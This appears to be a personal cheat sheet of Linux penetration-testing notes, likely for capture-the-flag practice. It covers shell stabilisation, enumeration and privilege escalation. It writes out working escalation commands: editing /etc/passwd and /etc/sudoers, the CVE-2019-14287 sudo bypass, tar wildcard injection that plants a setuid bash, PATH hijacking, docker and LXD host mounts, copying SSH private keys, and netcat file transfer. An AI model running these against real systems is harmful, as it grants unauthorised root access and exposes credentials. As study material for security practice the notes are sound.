# << LINUX NOTES >> #
# CONTENTS: #
[Shell Stabilisation](/shell-stabilisation)



- ## Shell Stabilisation ##
  In order to ensure that we dont accidentally lose our shell by using CTRL+C to end a process, we stabilise it. Stabilising also gives us the ability to run sudo, and use things like nano (as we need a pty for that).

  ### *PYTHON:* ###
    Find which version of python is on the system:
    ```bash
    which python
    ```
    The following means that CTRL+C doesnt close our shell, and also gives us autocomplete:
    ```bash
    python -c 'import pty;pty.spawn("/bin/bash")'
    ```
    **< BACKGROUND NC SESSION WITH CTRL+Z >**
    ```bash
    stty raw -echo
    fg
    ```
    **< HIT ENTER A FEW TIMES >**

    Set the terminal to deal with things - if 256 colour doesnt work then just use 'xterm'.
    ```bash
    reset
    export TERM=xterm-256color
    ```

  ### *'/usr/bin/script -qc /bin/bash /dev/null':* ###
    This is another alternative to spawning a pty instead of with Python. We then need to background the session and use our 'stty raw -echo' etc, as with the Python stabilisation.

    Should you wish to have the number of columns and rows displaying to you match your terminal, run 'stty size' on your local machine.
    The first number is the number of rows, the second the number of columns. Now, on the remote shell, run:
    ```bash
    stty rows <row-num> columns <column-num>
    ```

- ## Enumeration ##
  Probably the first command you want to run is 'id'. This will tell you your username, and what groups you belong to. This is useful information to know for later enumeration. We should also check the 'history' command and the user history files to see if anything important has been run that can clue us in (or even passwords entered on the command line).

  ### *Find Command:* ###
    Once we know our username, user id, and group names and ids, we can begin enumeration with the find command. 

    - #### *Files we own:* ####
      ```bash
      find / -user <our username> 2>/dev/null
      ```
    - #### *Files belonging to our group:* ####
      ```bash
      find / -group <group-name> 2>/dev/null
      ```

    - #### *Files that we can write to:* ####
      ```bash
      find / -type f -writable 2>/dev/null
      ```
      We can replace '-writable' with '-readable' also, as well as changing '-type f' to '-type d' to search for directories. 

    - #### *Files of a particular extension:* ####
      ```bash
      find / -type f -name *.<ext> 2>/dev/null
      ```


    We can run the find command with '-exec ls -la {} \;' to run a command upon every result found (the result of find is filled into the {}).
    It is worth noting that we can pipe (|) into 'grep -v '<str1>\|<str2>...' to filter out results we do not want.
    A useful thing to do is redirect the results to a file (/tmp is typically a word writeable directory), and then go through.


  ### *Useful Files and Directories to Check:* ###
    - #### *DIRECTORIES:* ####
      - /home/* - all users home directories
      - /home/*/.ssh - if we can write to a user's ssh directrory, or create one then we can gain a foothold as a different user
      - /var/backups - typical back up folder
      - /tmp - temporary storage for system processes
      - /var/tmp - temporary storage for system processes
      - /opt - additional packages/software
      - /var/mail - mail directory
      -/var/www/* - web directory, often containing the web log file or database which we can look through for credentials.

    - #### *FILES:* ####
      - /etc/passwd - cat and pipe into 'grep /bin' to find names of all users on the box that have shells. If writeable we can duplicate the root users line and just generate a password hash with: ```bash openssl passwd -1 -salt <salt> <password>```, then place it in the position of the password. 
      - /etc/sudoers - we may be able to read sudo permissions of users without using sudo -l, hoping for a NOPASSWD entries so that we may use and exploit. If this file is writeable, we can append this line to give ourselves sudo access to all commands to privesc with: ```bash echo "<username> ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers ```
      - /home/*/.ssh/id_rsa - this is a users ssh private key and if we can access it, we can copy to our system and ssh in as that user.
      - /home/*/.ssh/authorized_keys - if this file is writeable, we can add our own public key to it. Also, If we can make a directory of .ssh and then create an authorized_key file for the user.


  ### *Suid Files:* ###
    List all files that you can access that have SUID permissions
    ```bash
    find / -perm -4000 2>/dev/null
    ```
    Check on https://gtfobins.github.io/ for anything useful. 
    Sometimes the results will contain something cutsom which you can go on to enumerate, reverse engineer, and exploit.


  ### *Sudo:* ###
    List which files you have sudo permissions for:
    ```bash
    sudo -l
    ```
    Check on https://gtfobins.github.io/ for anything useful. 
    Sometimes the results will contain something cutsom which you can go on to enumerate, reverse engineer, and exploit.
    If the output is something like 'ALL = (jones) /usr/local/bin/mycommand', then we can run 'mycommand' as the 'jones' user. We do this with:
    ```bash
    sudo -u jones /usr/local/bin/mycommand
    ```

    Probably one of the biggest Sudo exploits is CVE-2019-14287. If the user has sudo permissions: '(ALL, !root) ALL', this can be exploited. A FULL TTY IS REQUIRED (so stabilise your shell).
    ```bash
    sudo -u#-1 /bin/bash -p
    ```


  ### *Capabilities:* ###
    List all capabilities that applications have:
    ```bash
    getcap -r / 2>/dev/null
    ```
    Check on https://gtfobins.github.io/ for anything useful.
    'cap_setuid' is an interesting capability. Even though the program is not a SUID file itslef, it has permissions to run code that sets the user id, and group id.
    'ep' is another interesting capability, meaning the binary has all capabilities.


  ### *PATH Variable Exploitation:* ###
    When we have access to a binary that is SUID or that you have Sudo accesses for, this obviously allows for a privilege escalation vector (whether lateral or upwards). Even better if we have access to the code behind the binary... if not we can reverse engineer it, running it to find out what it is doing, or decompiling in Ghidra, and analysing. The main thing we are looking for, is a command that is run without its full path. For example running 'date' rather than '/usr/bin/date'.


    Linux looks for binaries in a way which makes it exploitable. It will look in the user's PATH variable, which contains a lists of directories. Therefore, if we prepend '/tmp:' to the beginning of the PATH variable, then make our own 'date' file that is executable in the /tmp folder, we can make the program run whatever code we wish, with privileges of the user which the program runs as.

    ```bash
    export PATH=/tmp:$PATH
    ```


  ### *Python Import Exploitation:* ###
    In a similar way to PATH exploitation, we can exploit the way in which python programs import modules or libraries too...

    Python will look in the current folder with the rest fo the .py code files. It then goes off to the python root folder (/usr/local/python*). If these are writeable, or the folder is writeable by us then we can create our own code to be imported and run. Alternatively, we can check the PYTHONPATH environment variable to specify where it imports from, and perhaps change this if we are given permission to do so. This videos shows this: https://www.youtube.com/watch?v=ZwYqDZOvUpY&feature=emb_title


  ### *Cron Jobs:* ###
    To quickly find sechedules tasks, we can run donwload and run [pspy](https://github.com/DominicBreuker/pspy). This tells us all processes that are running. Using the -i flag, we can specify how often the scan should occur in milliseconds.

    Other useful commands:
    ```bash
    crontab -l
    cat /etc/crontab
    cat /etc/cron*

    systemctl list-timers --all
     ```


  ### *Wildcard Exploitation:* ###
    If a command is scheduled to run with wildcards, you can exploit this in a very interesting way... this is often used to break out of containers or priv esc to root.

    A straightforward example: create a file called '-la', then run 'ls *'. the file called -la is interpreted as an argument option for the ls command. Therefore, ls -la is what the system runs.

    A privesc example of this:
    ```bash
    #When you see this: 'tar cf archive.tar *':

    touch -- "--checkpoint=1"
    touch -- "--checkpoint-action=exec=sh shell.sh"
    echo "#\!/bin/bash\ncp /bin/bash /tmp/bash; chmod +s /tmp/bash" > shell.sh

    # Once the scirpt is executed, you will be able to run /tmp/bash -p to escalate to the user who owns the file.
    ```


  ### *Docker:* ###
    If the user is in the docker group, you can escalate with no special permissions:
    ```bash
    docker run -it --rm -v $PWD:/mnt bash
    ```


  ### *LXD Group Privesc:* ###
    If the user is in the lxd group, then you can escalate again with no special permissions:
    ```bash
    #Often the git cloning will be run on your machine and then the file transferred over.
    git clone https://github.com/saghul/lxd-alpine-builder
    ./build-alpine -a i686

    #The image would be transferred to the remote machine here.

    lxc image import ./alpine.tar.gz --alias myimage
    lxc init myimage mycontainer -c security.privileged=true

    # mount the /root into the image
    lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

    # interact
    lxc start mycontainer
    lxc exec mycontainer /bin/sh
    ```


  ### *KERNEL EXPLOITS:* ###
    ```bash
    uname -a
    ```
    The above will show you the kernel version you are running. It is now as striaghtforward as searching for exploits on exploitdb, or using searchsploit.


  ## *Transferring Files On and Off Linux Machines:* ##
    - ### *Python* ###
      ```
      # Change to the folder that the file is in.
      python -m SimpleHTTPServer 8080
      python3 -m http.server 8080
      
      #Then use 'wget <ip>:<port>/<file>' to download.
      ```
    
    - ### *SCP* ###
      ```bash
      #REQUIRES an ssh private key or a password.
      
      #From your machine
      scp <file> user@<remoteip>:<dest path on remote host>
      
      #To your machine
      scp user@<remoteip>:<path on remote host> <dest path on your machine>
      ```

    - ### *Netcat* ###
      ```bash
      #On receiving machine:
      nc -lvnp 8080 > file.out
      
      #On Sending Machine:
      nc <receiving machine IP> 8080 < file
      ```
